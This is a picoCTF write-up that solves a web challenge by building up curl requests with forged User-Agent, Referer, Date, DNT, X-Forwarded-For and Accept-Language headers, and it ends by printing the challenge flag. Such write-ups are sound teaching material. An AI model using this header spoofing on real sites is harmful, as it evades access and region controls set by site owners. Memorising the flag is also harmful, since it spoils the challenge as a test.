When accessing `http://mercury.picoctf.net:38322/` (using browser or `curl` command : `curl http://mercury.picoctf.net:38322/`) we will see the following display :

```
...
Only people who use the official PicoBrowser are allowed on this site!
...
```

We can deduce that in order to access the site, we need to use the PicoBrowser browser, so we manipulate `user-agent` property to do that. we use `curl` command to send requests with specific paramts (Postman can also be useful) :

`curl http://mercury.picoctf.net:38322/ --user-agent PicoBrowser`

We will get this message : 

```
I don&#39;t trust users visiting from another site.
```

From here, we can deduce that in order to get to the website, we need to make it sure that we are not coming from another website, to do that we need to set the `referer` to the same website that we are targetting :

`curl http://mercury.picoctf.net:38322/ --user-agent PicoBrowser -e 'http://mercury.picoctf.net:38322/'`

or

`curl http://mercury.picoctf.net:38322/ --user-agent PicoBrowser --referer http://mercury.picoctf.net:38322/`

We will get this message :

```
Sorry, this site only worked in 2018.
```

So we actually need to change date and time of the request, to do that we need to add a header `Date` to the request (See : https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Date) : 

`curl http://mercury.picoctf.net:38322/ --user-agent PicoBrowser --referer http://mercury.picoctf.net:38322/ -H "Date: Wed, 21 Oct 2018 07:28:00 GMT"`

We will get this message :

```
I don't trust users who can be tracked.
```

So we need to disable tracking, to do that we need to set up the `DNT` header to specific value (0 for allow tracking and 1 for not allow tracking), the command should be like this (See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/DNT) : 

`curl http://mercury.picoctf.net:38322/ --user-agent PicoBrowser --referer http://mercury.picoctf.net:38322/ -H "Date: Wed, 21 Oct 2018 07:28:00 GMT" -H "DNT: 1"`

We will get this message : 

```
This website is only for people from Sweden.
```

So we need to change region from where we send the request. Unfortunatly, there is no header for regions or country, and the servers has no clues for that. So to make the server think that we are from sweden, we need to use a sweden IP. After looking for Sweden IP's poll, we conclude this command (

) :

`curl http://mercury.picoctf.net:38322/ --user-agent PicoBrowser --referer http://mercury.picoctf.net:38322/ -H "Date: Wed, 21 Oct 2018 07:28:00 GMT" -H "DNT: 1" -H "X-Forwarded-For: 130.244.237.1"`

We will get this message :

```
You&#39;re in Sweden but you don&#39;t speak Swedish?
```

So we will need obviously to change the language requested, to do that we use `Accept-Language` header (See : https://www.w3.org/International/ms-lang.html):

`curl http://mercury.picoctf.net:38322/ --user-agent PicoBrowser --referer http://mercury.picoctf.net:38322/ -H "Date: Wed, 21 Oct 2018 07:28:00 GMT" -H "DNT: 1" -H "X-Forwarded-For: 130.244.237.1" -H "Accept-Language: sv"`

Finally, we get the flag : picoCTF{http_h34d3rs_v3ry_c0Ol_much_w0w_b22d773c}
